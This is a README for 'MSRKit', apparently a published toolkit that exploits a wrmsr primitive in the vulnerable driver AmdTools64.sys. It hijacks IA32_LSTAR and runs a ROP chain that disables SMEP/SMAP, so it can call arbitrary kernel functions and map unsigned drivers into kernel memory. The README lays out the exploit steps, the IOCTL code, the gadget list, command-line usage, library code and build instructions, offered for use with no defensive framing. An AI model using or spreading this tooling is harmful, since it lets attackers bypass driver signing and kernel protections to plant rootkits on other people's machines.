# MSRKit

A toolkit for **calling** kernel functions and **mapping** drivers **via** a ROP chain through a wrmsr primitive in a vulnerable driver (`AmdTools64.sys`).

## How it works

1. Loads `AmdTools64.sys` via `NtLoadDriver` (falls back to PnP devnode + GUID-based device interface if the symlink is unavailable)
2. Reads `IA32_LSTAR`  through the driver's MSR read IOCTL (`0xFFF02804`)
3. Scans `ntoskrnl.exe` for ROP gadgets (`pop rcx; ret`, `mov cr4, rcx; ret`, `wbinvd; ret`, etc.)
4. Overwrites `IA32_LSTAR` with the entry gadget, clears AC in FMASK, and issues `syscall`
5. The ROP chain clears SMEP/SMAP bits in CR4, dispatches the target function on the kernel stack, restores CR4 and LSTAR, returns to user mode via `sysretq`

Driver mapping follows the same path: allocates kernel pool via `ExAllocatePoolWithTag`, copies the prepared PE image (relocations applied, imports resolved, security cookie patched), and calls the mapped entry point.

## Usage

### CLI

```
msrkit <driver.sys> call    <ExportName> [args...]
msrkit <driver.sys> call_at <address>    [args...]
msrkit <driver.sys> map     <unsigned.sys> [entry args...]
msrkit <driver.sys> unmap   <address>
```

- `call` -- resolve and call a named `ntoskrnl` export. Arguments are parsed as integers (hex with `0x` prefix). Prints the return value.
- `call_at` -- call an arbitrary kernel virtual address.
- `map` -- map an unsigned driver into nonpaged pool and call its entry point (`ExAllocatePoolWithTag`). Prints the mapped base address.
- `unmap` -- free a previously mapped driver at the given base address.

### Library

```cpp
#include "msrkit.h"

#pragma comment(lib, "msrkit.lib")

int main()
{
	MSRK::INIT(L"AmdTools64.sys");

	void* mptr = MSRK::CALL("ExAllocatePool2", 0x40ULL, 0x1000, 'Ruri');
	std::cout << "Memory allocate: " << mptr << std::endl;

	auto mptr23 = MSRK::MAP("driver.sys", 123, 456);
	std::cout << "Driver mapped: " << std::hex << (uintptr_t)mptr23 << "\n";

	// raw call
	std::vector<uint64_t>args = { 0x40ULL, 1024, 'Tagz' };
	void* mptr24 = MSRK::M_FUNCTION::CALL("ExAllocatePool2", args.data(), args.size());
	std::cout << "raw memory alloc : " << mptr24 << std::endl;

	std::vector<uint64_t>args2 = { 123, 456 };
	auto mptr25 = MSRK::M_DRIVERMAP::MAP( "driver.sys", args2.data(), args2.size() );

	MSRK::UNMAP(mptr23);	
	MSRK::CLEANUP();
}
```

Optionally pass an existing driver handle to skip loading:
```cpp
MSRK::INIT("AmdTools64.sys", existing_handle);
```

## Build

Requires Visual Studio with MSVC (v143+) and MASM (`ml64.exe`).

```
cmake -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
```

Output: `build/Release/msrkit.exe` (CLI) and `msrkit.lib` (static library).

CFG is disabled (`/guard:cf-`). Stack cookies (`/GS`) are enabled.

## Features
- Full support for all Windows 10 and 11 builds
- Compatible with KPTI
- No HVCI support (HVCI must be disabled)

## Limitations

- Single-core execution only -- thread is pinned to CPU 0 during kernel calls
- Concurrent LSTAR hijacks from separate processes will BSOD (one caller at a time)
- Zw/Nt syscall stubs cannot be called from the LSTAR context (re-enters KiSystemService)
